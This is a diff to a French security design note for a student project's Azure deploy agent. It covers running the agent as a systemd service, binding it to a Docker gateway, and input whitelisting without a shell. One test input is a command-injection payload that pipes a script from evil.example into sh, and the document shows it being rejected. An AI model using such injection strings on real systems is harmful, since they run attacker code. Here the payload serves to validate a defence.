@@ -66,10 +66,13 @@ Frontend (bouton Déployer, futur)
         ▼
 Backend (conteneur Docker, pfe-backend)      ── AUCUN credential Azure ici
         │ HTTP + secret partagé (X-Agent-Secret)
+        │ body = { project, imageTag } UNIQUEMENT — jamais de commande
         │ → 172.19.0.1:7799 (gateway du bridge Docker "pfe-network")
         ▼
 Agent hôte (infra/azure-deploy-agent/agent.py) ── seul processus à lire ~/.azure
         │ az acr login / az acr credential show / az container create
+        │ (tous les paramètres sauf imageTag viennent de PROJECTS, fixé
+        │  dans le code de l'agent — jamais du corps de la requête)
         ▼
 Azure (ACR acrpfedevsecops + ACI rg-pfe-devsecops)
 ```
@@ -82,26 +85,98 @@ de ne pas regagner en surface d'attaque ce qu'on a perdu en granularité :
 compromettre le conteneur backend (dépendances npm, réseau exposé) ne donne
 accès qu'au déclenchement d'un déploiement pré-défini, jamais au token lui-même.
 
-L'agent applique 3 garde-fous, dans cet ordre, à chaque appel :
+#### Cycle de vie de l'agent (process hôte, pas un conteneur)
+
+Service **systemd utilisateur**, PAS dans `docker-compose.yml` — il doit
+tourner sur l'hôte pour lire `~/.azure`, jamais dans un conteneur Docker :
+
+```bash
+# Installation (une fois)
+mkdir -p ~/.config/systemd/user
+cp infra/azure-deploy-agent/azure-deploy-agent.service ~/.config/systemd/user/
+loginctl enable-linger "$(whoami)"     # survit même sans session interactive active
+systemctl --user daemon-reload
+systemctl --user enable --now azure-deploy-agent.service
+
+# Statut / logs
+systemctl --user status azure-deploy-agent.service
+journalctl --user -u azure-deploy-agent.service -f
+```
+
+`Restart=on-failure` dans l'unit → un crash relance le process en ~1s,
+prouvé (`kill -9` sur le PID → nouveau PID actif en moins de 2s). Le secret
+`AZURE_DEPLOY_AGENT_SECRET` est lu via `EnvironmentFile=infra/azure-deploy-agent/.env`
+(gitignored — règle `.env` globale du repo), jamais écrit dans l'unit versionné.
+`loginctl enable-linger` fait que le service redémarre automatiquement après
+un redémarrage de la machine, sans attendre une connexion interactive.
+
+#### Sécurité de l'écoute
+
+Lié explicitement à `172.19.0.1` (gateway du bridge Docker `pfe-network`),
+jamais à `0.0.0.0` :
+```
+$ ss -tlnp | grep 7799
+LISTEN 0 5 172.19.0.1:7799 0.0.0.0:*  users:(("python3",...))
+```
+Vérifié : `127.0.0.1:7799` (loopback) refuse la connexion — seuls les
+conteneurs du réseau `pfe-network` (dont `pfe-backend`) peuvent atteindre
+l'agent, pas le reste de la machine ni le LAN.
+
+#### Périmètre des commandes — SCRIPT FIXE, jamais une commande du backend
+
+Le backend ne peut envoyer que `{ project: "devsecops-testbed", imageTag: "..." }`.
+**Tout le reste — `resourceGroup`, `containerName`, image complète (dépôt
+ACR), `cpu`, `memoryInGb`, `ports` — vient exclusivement du dict `PROJECTS`
+codé en dur dans `agent.py`, jamais du corps de la requête.** Trois couches,
+chacune suffisante seule :
+
+1. **Whitelist de projet** : `project` doit correspondre EXACTEMENT à une clé
+   de `PROJECTS`. Une clé inconnue → `400 UNKNOWN_PROJECT`, rien n'est exécuté.
+2. **Validation stricte du seul champ variable** (`imageTag`) : regex
+   `^[A-Za-z0-9_][A-Za-z0-9._-]{0,127}$` (charset officiel des tags Docker) —
+   rejette tout séparateur shell (`;`, `&&`, `|`, `` ` ``, `$()`, espace).
+3. **Aucune commande shell construite par concaténation de texte** pour les
+   valeurs externes : `az container create` est appelé via
+   `subprocess.run([...liste...], shell=False)`, pas une f-string passée à
+   `shell=True`. Sans shell, un `;` dans une valeur reste un caractère
+   littéral du champ — il ne peut structurellement pas être interprété comme
+   un séparateur de commande, même si la regex de la couche 2 avait un trou.
+
+Testé (3 tentatives, toutes rejetées avant tout appel `az`) :
+```
+{"project":"totally-not-registered","imageTag":"latest"}
+→ 400 UNKNOWN_PROJECT
+
+{"project":"devsecops-testbed","imageTag":"x; curl http://evil.example/pwn.sh | sh #"}
+→ 400 INVALID_IMAGE_TAG
+
+{"resourceGroup":"rg-musee-virtuel","containerName":"whatever","image":"whatever:latest"}
+→ 400 (project/imageTag manquants — l'ancien format à champs libres n'existe
+       plus, il n'y a même pas de code qui saurait quoi en faire)
+```
+
+Garde-fous restants, dans l'ordre à chaque appel légitime :
 1. Secret partagé absent côté agent → l'agent refuse de démarrer (fail-closed).
 2. Secret fourni par le backend invalide → `403`, rien d'exécuté.
-3. `resourceGroup` demandé ≠ `rg-pfe-devsecops` → `400`, rejeté même si la
-   session sous-jacente aurait les droits d'agir ailleurs (prouvé : requête
-   vers `rg-musee-virtuel` refusée par l'agent, jamais transmise à `az`).
-4. Session `az` invalide (`az account show` échoue) → `409` avec un message
+3. `project`/`imageTag` invalides → `400` (voir ci-dessus).
+4. `resourceGroup` résolu depuis `PROJECTS` vérifié `== rg-pfe-devsecops`
+   explicitement quand même (défense en profondeur, même sur notre propre
+   config fixe).
+5. Session `az` invalide (`az account show` échoue) → `409` avec un message
    clair (`AZURE_SESSION_EXPIRED`, "faire az login"), jamais un crash ni une
    tentative de déploiement. Vérifié systématiquement à chaque déploiement,
    jamais mis en cache d'un appel précédent.
 
 Secret partagé (`AZURE_DEPLOY_AGENT_SECRET`) : même pattern que
 `N8N_CALLBACK_SECRET`/`N8N_INTERNAL_SECRET` — variable d'env dans
-`backend/.env` (gitignored) et `docker-compose.yml`. **Dette notée** : comme
-les secrets N8N_*, il est en clair dans `docker-compose.yml`, qui est
-lui-même versionné — cette modification spécifique n'est volontairement PAS
-committée (secret changé à chaque régénération de l'agent). Externalisation
-propre (fichier `.env` référencé par `env_file:`, jamais de valeur littérale
-dans un fichier suivi par git) documentée comme dette pour tous ces secrets,
-pas seulement celui-ci.
+`backend/.env` (gitignored), `docker-compose.yml`, et
+`infra/azure-deploy-agent/.env` (gitignored, lu par systemd). **Dette
+notée** : comme les secrets N8N_*, il est en clair dans `docker-compose.yml`,
+qui est lui-même versionné — cette modification spécifique n'est
+volontairement PAS committée (secret changé à chaque régénération de
+l'agent). Externalisation propre (fichier `.env` référencé par `env_file:`,
+jamais de valeur littérale dans un fichier suivi par git) documentée comme
+dette pour tous ces secrets, pas seulement celui-ci.
 
 ### Limite connue
 
@@ -115,19 +190,24 @@ propre à cet environnement d'études, pas une limite d'architecture.
 ### Preuve (2026-08-08)
 
 Déploiement déclenché par un appel HTTP au backend (`POST
-/api/azure-deploy/deploy`), pas depuis un terminal :
+/api/azure-deploy/deploy`, body `{"project":"devsecops-testbed","imageTag":"fixed-base-1.0.0"}`),
+pas depuis un terminal :
 
 - `az acr login` + `az acr credential show` : OK (via la session hôte).
-- `az container create` (image `fixed-base-1.0.0` déjà prouvée, ACR
-  `acrpfedevsecops`, RG `rg-pfe-devsecops`) : OK.
+- `az container create` (argv liste, image `fixed-base-1.0.0` déjà prouvée,
+  ACR `acrpfedevsecops`, RG `rg-pfe-devsecops` résolus depuis `PROJECTS`) : OK.
 - État poll jusqu'à `Running`, `restartCount: 0`.
 - `/api/health` via `az container exec` (pas d'IP publique, cohérent avec la
-  preuve du 06/08) → `{"status":"UP"}`.
+  preuve du 06/08), retry court (jusqu'à 30s — "Running" ACI précède de
+  quelques secondes l'ouverture du port Spring Boot) → `{"status":"UP"}`.
 - Garde-fou session testé positif (`~/.azure` temporairement absent →
   réponse `409 AZURE_SESSION_EXPIRED` propre côté backend, pas de crash) et
   négatif (session restaurée → `200`).
-- Garde-fou RG testé : requête vers `rg-musee-virtuel` → `400
-  RESOURCE_GROUP_NOT_ALLOWED`, jamais transmise à Azure.
+- Les 3 tentatives d'entrées invalides ci-dessus (projet inconnu, injection
+  shell dans imageTag, ancien format à champs libres) → toutes `400`, aucun
+  appel `az` déclenché.
+- Cycle de vie : service systemd actif, `kill -9` du process → relancé
+  automatiquement (< 2s), toujours fonctionnel après.
 - Conteneur de preuve supprimé immédiatement après vérification (pas de coût
   résiduel), comme pour la preuve du 06/08.
 
